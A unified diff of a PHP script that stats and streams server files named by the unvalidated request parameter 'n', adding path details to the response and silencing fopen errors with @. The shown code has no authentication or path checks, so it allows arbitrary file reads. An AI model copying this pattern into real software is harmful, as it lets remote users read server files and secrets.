@@ -18,7 +18,6 @@ if( !empty($_REQUEST['n']) )
 switch ( $_REQUEST['c'] ) {
     case 'i':
 		if( $vstat = stat( $_REQUEST['n'] ) ) {
-			$resp['type'] = filetype( $_REQUEST['n']);
 			$resp['size'] = $vstat['size'] ;
 			$resp['atime'] = $vstat['atime'] ;
 			$resp['mtime'] = $vstat['mtime'] ;
@@ -27,12 +26,15 @@ switch ( $_REQUEST['c'] ) {
 			$resp['ino'] = $vstat['ino'] ;
 			$resp['mode'] = $vstat['mode'] ;
 			$resp['realpath'] = realpath($_REQUEST['n']);
+			$resp['type'] = filetype( $resp['realpath'] );
+			$resp['basename'] = basename( $resp['realpath'] );
+			$resp['dirname'] = dirname( $resp['realpath'] );
 			$resp['res'] = 1 ;
 		}
 		break;
 		
 	case 'rm':
-		$f = fopen( $_REQUEST['n'], 'rb' ) ;
+		@$f = fopen( $_REQUEST['n'], 'rb' ) ;
 		if( $f ) {
 			$pos = 0 ;
 			if( !empty( $_REQUEST['o'] ) ) {
@@ -67,7 +69,7 @@ switch ( $_REQUEST['c'] ) {
 
 	case 'rl':
 		header("Content-Type: application/octet-stream");	
-		$f = fopen( $_REQUEST['n'], 'rb' ) ;
+		@$f = fopen( $_REQUEST['n'], 'rb' ) ;
 		if( $f ) {
 			if( !empty( $_REQUEST['o'] ) ) {
 				fseek( $f, $_REQUEST['o'], SEEK_SET ) ;
@@ -94,7 +96,7 @@ switch ( $_REQUEST['c'] ) {
 		
 	case 'r' :
 		header("Content-Type: application/octet-stream");	
-		$f = fopen( $_REQUEST['n'], 'rb' ) ;
+		@$f = fopen( $_REQUEST['n'], 'rb' ) ;
 		if( $f ) {
 			$offset = 0 ;
 			fseek( $f, 0, SEEK_END );
@@ -144,7 +146,7 @@ switch ( $_REQUEST['c'] ) {
 		
 	case 'f' :
 		header("Content-Type: application/octet-stream");	
-		$f = fopen( $_REQUEST['n'], 'rb' ) ;
+		@$f = fopen( $_REQUEST['n'], 'rb' ) ;
 		if( $f ) {
 			header( "Accept-Ranges: bytes" );
 			fseek( $f, 0, SEEK_END );
